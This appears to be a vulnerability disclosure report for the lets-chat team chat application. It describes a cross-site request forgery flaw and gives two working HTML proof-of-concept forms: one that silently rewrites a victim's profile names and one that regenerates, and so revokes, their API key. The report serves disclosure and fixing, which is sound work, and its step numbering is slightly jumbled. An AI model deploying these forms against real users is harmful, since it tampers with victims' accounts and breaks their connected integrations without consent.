# :bug: Description

The `lets-chat` application is a simple `chat` used for `small teams`, and can be hosted locally in order to have a better control on it.
The chat however is vulnerable against a `POST-based CSRF` issue which occurs in the `/account/profile` endpoint and many others, leading to `personal information` change and `api key` revocation/generation.

# :fire: PoC

1. Install the chat using the `steps` described here:
2. Create a new `user` and login
3. Create a malicious file containing the following CSRF PoC: https://github.com/sdelements/lets-chat/wiki/Installation

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localtest.me:5000/account/profile" method="POST">
      <input type="hidden" name="display&#45;name" value="HACKED" />
      <input type="hidden" name="first&#45;name" value="HACKED;" />
      <input type="hidden" name="last&#45;name" value="HACKED" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

4. Victim opens the crafted file (many scenarios are plausible) and it's name/display name are changed

**Another POC for regenerating keys:**

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localtest.me:5000/account/token/generate" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

4. Opening this the `api key` created before will be `deleted` and another one created (invalidates previously connected applications)
